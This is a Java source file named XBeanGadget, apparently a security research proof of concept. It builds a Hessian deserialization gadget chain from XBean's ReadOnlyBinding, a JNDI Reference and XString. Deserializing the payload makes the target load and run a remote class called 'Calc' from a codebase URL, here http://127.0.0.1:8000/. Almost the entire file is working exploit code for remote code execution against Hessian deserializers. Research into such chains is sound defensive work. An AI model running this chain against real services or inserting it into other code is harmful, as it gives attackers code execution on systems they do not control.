package com.test.gadget;

import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.xbean.naming.context.WritableContext;
import org.springframework.aop.target.HotSwappableTargetSource;
import tools.HessianTools;
import tools.ReflectTools;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.util.HashMap;

public class XBeanGadget {
    public static void main(String[] args) throws Exception {
        Object payload = getPayload();
        byte[] bytes = HessianTools.hessianSer2bytes(payload, "2");
        HessianTools.hessianDeser(bytes, "2");
    }

    public static Object getPayload() throws Exception {
        String refAddr = "http://127.0.0.1:8000/";
        String refClassName = "Calc";

        Reference ref = new Reference(refClassName, refClassName, refAddr);
        WritableContext writableContext = new WritableContext();

        // 创建ReadOnlyBinding对象
        String classname = "org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding";
        Object readOnlyBinding = Class.forName(classname).getDeclaredConstructor(String.class, Object.class, Context.class)
                .newInstance("aaa", ref, writableContext);

        XString xString = new XString("any");

        HashMap<Object, Object> finalMap = ReflectTools.makeEqualMap(xString, readOnlyBinding);

        return finalMap;
    }
}
